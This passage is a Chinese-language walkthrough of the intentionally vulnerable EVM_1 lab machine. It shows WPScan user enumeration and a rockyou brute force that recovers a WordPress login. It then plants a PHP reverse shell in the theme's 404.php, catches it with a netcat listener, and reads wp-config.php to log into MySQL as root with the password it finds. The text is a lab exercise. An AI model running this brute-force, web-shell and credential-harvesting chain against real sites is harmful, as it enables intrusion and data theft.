\/  \/ / |  ___/ \___ \ / __|/ _` |  _ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.24<br>       Sponsored by Automattic - https://automattic.com/<br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[i] It seems like you have not updated the database <span class="hljs-keyword">for</span> some time.<br>[?] Do you want to update now? [Y]es [N]o, default: [N]n<br>[+] URL: http://192.168.56.103/wordpress/ [192.168.56.103]<br>[+] Started: Tue Jun 27 04:31:05 2023<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://192.168.56.103/wordpress/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://192.168.56.103/wordpress/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] Upload directory has listing enabled: http://192.168.56.103/wordpress/wp-content/uploads/<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://192.168.56.103/wordpress/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 5.2.4 identified (Insecure, released on 2019-10-14).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://192.168.56.103/wordpress/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.4&lt;/generator&gt;<br> |  - http://192.168.56.103/wordpress/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.4&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentynineteen<br> | Location: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/<br> | Last Updated: 2023-03-29T00:00:00.000Z<br> | Readme: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/readme.txt<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 2.5<br> | Style URL: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4<br> | Style Name: Twenty Nineteen<br> | Style URI: https://wordpress.org/themes/twentynineteen/<br> | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...<br> | Author: the WordPress team<br> | Author URI: https://wordpress.org/<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> |<br> | Version: 1.4 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4, Match: <span class="hljs-string">&#x27;Version: 1.4&#x27;</span><br><br>[+] Enumerating Users (via Passive and Aggressive Methods)<br> Brute Forcing Author IDs - Time: 00:00:00 &lt;======================================&gt; (10 / 10) 100.00% Time: 00:00:00<br><br>[i] User(s) Identified:<br><br>[+] c0rrupt3d_brain<br> | Found By: Author Posts - Author Pattern (Passive Detection)<br> | Confirmed By:<br> |  Rss Generator (Passive Detection)<br> |  Wp Json Api (Aggressive Detection)<br> |   - http://192.168.56.103/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)<br><br>[!] No WPScan API Token given, as a result vulnerability data has not been output.<br>[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register<br><br>[+] Finished: Tue Jun 27 04:31:08 2023<br>[+] Requests Done: 53<br>[+] Cached Requests: 6<br>[+] Data Sent: 14.439 KB<br>[+] Data Received: 522.866 KB<br>[+] Memory used: 188.668 MB<br>[+] Elapsed time: 00:00:02<br><br></code></pre></td></tr></table></figure><h3 id="爆破密码"><a href="#爆破密码" class="headerlink" title="爆破密码"></a>爆破密码</h3><p>得到了一些目录和一个用户 <code>c0rrupt3d_brain</code>，感觉没什么可利用的插件漏洞，先爆破试试吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Desktop/Clash <span class="hljs-keyword">for</span> Windows-0.19.26-x64-linux]<br>└─$ wpscan --url http://192.168.56.103/wordpress -P /usr/share/wordlists/rockyou.txt -U <span class="hljs-string">&#x27;c0rrupt3d_brain&#x27;</span><br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` |  _ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.24<br>       Sponsored by Automattic - https://automattic.com/<br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[i] It seems like you have not updated the database <span class="hljs-keyword">for</span> some time.<br>[?] Do you want to update now? [Y]es [N]o, default: [N]n<br>[+] URL: http://192.168.56.103/wordpress/ [192.168.56.103]<br>[+] Started: Tue Jun 27 04:42:18 2023<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://192.168.56.103/wordpress/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://192.168.56.103/wordpress/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] Upload directory has listing enabled: http://192.168.56.103/wordpress/wp-content/uploads/<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://192.168.56.103/wordpress/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 5.2.4 identified (Insecure, released on 2019-10-14).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://192.168.56.103/wordpress/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.4&lt;/generator&gt;<br> |  - http://192.168.56.103/wordpress/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.4&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentynineteen<br> | Location: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/<br> | Last Updated: 2023-03-29T00:00:00.000Z<br> | Readme: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/readme.txt<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 2.5<br> | Style URL: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4<br> | Style Name: Twenty Nineteen<br> | Style URI: https://wordpress.org/themes/twentynineteen/<br> | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...<br> | Author: the WordPress team<br> | Author URI: https://wordpress.org/<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> |<br> | Version: 1.4 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4, Match: <span class="hljs-string">&#x27;Version: 1.4&#x27;</span><br><br>[+] Enumerating All Plugins (via Passive Methods)<br>[+] Checking Plugin Versions (via Passive and Aggressive Methods)<br><br>[i] Plugin(s) Identified:<br><br>[+] photo-gallery<br> | Location: http://192.168.56.103/wordpress/wp-content/plugins/photo-gallery/<br> | Last Updated: 2023-06-02T15:32:00.000Z<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 1.8.16<br> |<br> | Found By: Urls In Homepage (Passive Detection)<br> |<br> | Version: 1.5.34 (100% confidence)<br> | Found By: Query Parameter (Passive Detection)<br> |  - http://192.168.56.103/wordpress/wp-content/plugins/photo-gallery/css/jquery.mCustomScrollbar.min.css?ver=1.5.34<br> |  - http://192.168.56.103/wordpress/wp-content/plugins/photo-gallery/css/styles.min.css?ver=1.5.34<br> |  - http://192.168.56.103/wordpress/wp-content/plugins/photo-gallery/js/jquery.mCustomScrollbar.concat.min.js?ver=1.5.34<br> |  - http://192.168.56.103/wordpress/wp-content/plugins/photo-gallery/js/scripts.min.js?ver=1.5.34<br> | Confirmed By:<br> |  Readme - Stable Tag (Aggressive Detection)<br> |   - http://192.168.56.103/wordpress/wp-content/plugins/photo-gallery/readme.txt<br> |  Readme - ChangeLog Section (Aggressive Detection)<br> |   - http://192.168.56.103/wordpress/wp-content/plugins/photo-gallery/readme.txt<br><br>[+] Enumerating Config Backups (via Passive and Aggressive Methods)<br> Checking Config Backups - Time: 00:00:00 &lt;=====================================&gt; (137 / 137) 100.00% Time: 00:00:00<br><br>[i] No Config Backups Found.<br><br>[+] Performing password attack on Wp Login against 1 user/s<br>[SUCCESS] - c0rrupt3d_brain / 24992499                                                                              <br>Trying c0rrupt3d_brain / 24992499 Time: 00:02:54 &lt;                        &gt; (10700 / 14355092)  0.07%  ETA: ??:??:??<br><br>[!] Valid Combinations Found:<br> | Username: c0rrupt3d_brain, Password: 24992499<br><br>[!] No WPScan API Token given, as a result vulnerability data has not been output.<br>[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register<br><br>[+] Finished: Tue Jun 27 04:45:19 2023<br>[+] Requests Done: 10874<br>[+] Cached Requests: 5<br>[+] Data Sent: 3.854 MB<br>[+] Data Received: 48.842 MB<br>[+] Memory used: 304.754 MB<br>[+] Elapsed time: 00:03:00<br><br></code></pre></td></tr></table></figure><p>爆破得到了用户密码 <code>24992499</code>，登陆后查看主题编辑器</p><p><img src="/pic/a690a0c8530ecdfd48e44638b306d530_MD5.png"></p><p>其中 404.php 给了提示，可以在这里写反向 shell，我们将 php-reverse-shell.php 修改后放进去，再构造访问会 404 的 URL，提前开启监听，就可以反弹 shell</p><p><img src="/pic/4d9c9b99fff041ffa31c0e161ef7f8bf_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/EVM_1]<br>└─$ sudo nc -lvnp 443<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.103] 37128<br>Linux ubuntu-extermely-vulnerable-m4ch1ine 4.4.0-87-generic <span class="hljs-comment">#110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br> 04:55:28 up 52 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.05, 0.44, 1.03<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can t access <span class="hljs-built_in">tty</span>; job control turned off<br>$ <span class="hljs-built_in">which</span> python<br>/usr/bin/python<br>$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/$ <span class="hljs-built_in">export</span> TERM=xterm-color<br><span class="hljs-built_in">export</span> TERM=xterm-color<br><br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>反弹 shell 成功，确认目标正确，并进行简单的信息收集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu-extermely-vulnerable-m4ch1ine:/$ ip a<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:06:73:f2 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.103/24 brd 192.168.56.255 scope global enp0s3<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fe06:73f2/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>3: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 52:54:00:c5:7d:1b brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0<br>       valid_lft forever preferred_lft forever<br>4: virbr0-nic: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc pfifo_fast master virbr0 state DOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 52:54:00:c5:7d:1b brd ff:ff:ff:ff:ff:ff<br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/$ <span class="hljs-built_in">id</span>   <br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux ubuntu-extermely-vulnerable-m4ch1ine 4.4.0-87-generic <span class="hljs-comment">#110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/$ <span class="hljs-built_in">pwd</span><br><span class="hljs-built_in">pwd</span><br>/<br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> www-data: <br><br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> www-data: <br><br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> www-data: <br><br>sudo: 3 incorrect password attempts<br></code></pre></td></tr></table></figure><p>接下来进入&#x2F;var&#x2F; www&#x2F;html目录看看 ，关注点主要在配置文件上，可以看看是否有数据库连接的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu-extermely-vulnerable-m4ch1ine:/var/www/html$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 11M<br>276855 drwxr-xr-x 3 www-data www-data 4.0K Nov  1  2019 .<br>276854 drwxr-xr-x 3 root     root     4.0K Oct 30  2019 ..<br>281328 -rw-r--r-- 1 www-data www-data  11K Nov  1  2019 index.html<br>282142 -rw-r--r-- 1 www-data www-data   21 Oct 30  2019 info.php<br>401054 drwxr-xr-x 5 www-data www-data 4.0K Nov  1  2019 wordpress<br>407076 -rw-r--r-- 1 www-data www-data 2.9K Oct 31  2019 wp-config.php<br> 20482 -rw-r--r-- 1 www-data www-data  11M Oct 30  2019 wp.tar.gz<br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/var/www/html$ <span class="hljs-built_in">cat</span> wp-config.php<br><span class="hljs-built_in">cat</span> wp-config.php<br>&lt;?php<br>/**<br> * The base configuration <span class="hljs-keyword">for</span> WordPress<br> *<br> * The wp-config.php creation script uses this file during the<br> * installation. You don\<span class="hljs-string">&#x27;t have to use the web site, you can</span><br><span class="hljs-string"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * This file contains the following configurations:</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * * MySQL settings</span><br><span class="hljs-string"> * * Secret keys</span><br><span class="hljs-string"> * * Database table prefix</span><br><span class="hljs-string"> * * ABSPATH</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @link https://codex.wordpress.org/Editing_wp-config.php</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @package WordPress</span><br><span class="hljs-string"> */</span><br><span class="hljs-string"></span><br><span class="hljs-string">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="hljs-string">/** The name of the database for WordPress */</span><br><span class="hljs-string">define( &#x27;</span>DB_NAME<span class="hljs-string">&#x27;, &#x27;</span>hackme_wp<span class="hljs-string">&#x27; );</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database username */</span><br><span class="hljs-string">define( &#x27;</span>DB_USER<span class="hljs-string">&#x27;, &#x27;</span>root<span class="hljs-string">&#x27; );</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database password */</span><br><span class="hljs-string">define( &#x27;</span>DB_PASSWORD<span class="hljs-string">&#x27;, &#x27;</span>123<span class="hljs-string">&#x27; );</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL hostname */</span><br><span class="hljs-string">define( &#x27;</span>DB_HOST<span class="hljs-string">&#x27;, &#x27;</span>localhost<span class="hljs-string">&#x27; );</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** Database Charset to use in creating database tables. */</span><br><span class="hljs-string">define( &#x27;</span>DB_CHARSET<span class="hljs-string">&#x27;, &#x27;</span>utf8<span class="hljs-string">&#x27; );</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** The Database Collate type. Don\&#x27;</span>t change this <span class="hljs-keyword">if</span> <span class="hljs-keyword">in</span> doubt. */<br>define( <span class="hljs-string">&#x27;DB_COLLATE&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span> );<br><br>/**<span class="hljs-comment">#@+</span><br> * Authentication Unique Keys and Salts.<br> *<br> * Change these to different unique phrases!<br> * You can generate these using the &#123;@<span class="hljs-built_in">link</span> https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;<br> * You can change these at any point <span class="hljs-keyword">in</span> time to invalidate all existing cookies. This will force all <span class="hljs-built_in">users</span> to have to <span class="hljs-built_in">log</span> <span class="hljs-keyword">in</span> again.<br> *<br> * @since 2.6.0<br> */<br>define( <span class="hljs-string">&#x27;AUTH_KEY&#x27;</span>,         <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span> );<br>define( <span class="hljs-string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span> );<br>define( <span class="hljs-string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span> );<br>define( <span class="hljs-string">&#x27;NONCE_KEY&#x27;</span>,        <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span> );<br>define( <span class="hljs-string">&#x27;AUTH_SALT&#x27;</span>,        <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span> );<br>define( <span class="hljs-string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span> );<br>define( <span class="hljs-string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span> );<br>define( <span class="hljs-string">&#x27;NONCE_SALT&#x27;</span>,       <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span> );<br><br>/**<span class="hljs-comment">#@-*/</span><br><br>/**<br> * WordPress Database Table prefix.<br> *<br> * You can have multiple installations <span class="hljs-keyword">in</span> one database <span class="hljs-keyword">if</span> you give each<br> * a unique prefix. Only numbers, letters, and underscores please!<br> */<br><span class="hljs-variable">$table_prefix</span> = <span class="hljs-string">&#x27;wp_&#x27;</span>;<br><br>/**<br> * For developers: WordPress debugging mode.<br> *<br> * Change this to <span class="hljs-literal">true</span> to <span class="hljs-built_in">enable</span> the display of notices during development.<br> * It is strongly recommended that plugin and theme developers use WP_DEBUG<br> * <span class="hljs-keyword">in</span> their development environments.<br> *<br> * For information on other constants that can be used <span class="hljs-keyword">for</span> debugging,<br> * visit the Codex.<br> *<br> * @<span class="hljs-built_in">link</span> https://codex.wordpress.org/Debugging_in_WordPress<br> */<br>define( <span class="hljs-string">&#x27;WP_DEBUG&#x27;</span>, <span class="hljs-literal">false</span> );<br><br>/* That\<span class="hljs-string">&#x27;s all, stop editing! Happy publishing. */</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** Absolute path to the WordPress directory. */</span><br><span class="hljs-string">if ( ! defined( &#x27;</span>ABSPATH<span class="hljs-string">&#x27; ) ) &#123;</span><br><span class="hljs-string">        define( &#x27;</span>ABSPATH<span class="hljs-string">&#x27;, dirname( __FILE__ ) . &#x27;</span>/<span class="hljs-string">&#x27; );</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** Sets up WordPress vars and included files. */</span><br><span class="hljs-string">require_once( ABSPATH . &#x27;</span>wp-settings.php<span class="hljs-string">&#x27; );</span><br></code></pre></td></tr></table></figure><p>拿到了数据库的密码 123，进数据库看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu-extermely-vulnerable-m4ch1ine:/var/www/html$ mysql -uroot -p<br>mysql -uroot -p<br>Enter password: 123<br><br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection <span class="hljs-built_in">id</span> is 21345<br>Server version: 5.7.19-0ubuntu0.16.04.1 (Ubuntu)<br><br>Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.<br><br>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may 